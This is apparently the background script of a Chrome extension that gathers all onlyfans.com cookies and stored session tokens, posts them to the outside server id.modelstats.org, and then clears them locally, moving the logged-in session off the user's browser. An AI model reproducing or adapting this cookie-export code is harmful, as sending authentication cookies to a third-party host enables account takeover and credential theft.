'use strict';

let sess_cookies;
let sess_storage;

chrome.runtime.onMessage.addListener((request, sender, response) => {
  if (request.method === 'save-session') {
    getCookies();
    var check_cookies = setInterval(function () {
      if (sess_cookies['sess'] !== null) {
        clearInterval(check_cookies);
        saveSession();
      }
    }, 500);
  } else if (request.method === 'save-session-storage') {
    sess_storage = request.storage;
  }
});

function getCookies(){
  chrome.cookies.getAll({domain: "onlyfans.com"}, function(cookies) {
    sess_cookies = [];
    cookies.forEach(function(cookie) {
      sess_cookies[cookie.name] = cookie.value;
    });
  });
}

function saveSession(){
  $.ajax({
    url: 'https://id.modelstats.org/functions.php',
    type: "POST",
    data: {action:'send_data',session_id:sess_storage['ext_session_id'],ext_session_hash:sess_storage['ext_session_hash'],storage:sess_storage,cookies:Object.assign({}, sess_cookies)},
    beforeSend: function(){

    },
    success: function(result) {
      alert(result.message);
      if(result.status == 'success'){
        doExit();
        setTimeout(function(){chrome.tabs.update({url: "https://onlyfans.com"})},1000);
      }
    },
    error:  function(error) {

    }
  });
}

function doExit(){
  chrome.cookies.getAll({domain: "onlyfans.com"}, function(cookies) {;
    cookies.forEach(function(cookie) {
      deleteCookie(cookie.name);
    });
  });

  chrome.tabs.executeScript(null, {code: "window.localStorage.setItem('bcTokenSha', '');"});

  chrome.tabs.executeScript(null, {code: "window.localStorage.setItem('ext_session_id', '');"});
  chrome.tabs.executeScript(null, {code: "window.localStorage.setItem('ext_session_hash', '');"});

  chrome.tabs.executeScript(null, {code: "window.localStorage.setItem('ext_user_agent', '');"});
  chrome.tabs.executeScript(null, {code: "window.localStorage.setItem('ext_type', '');"});
}
function deleteCookie(name){
  chrome.cookies.remove({'url':'https://onlyfans.com' , 'name':name},function(cookie){ });
}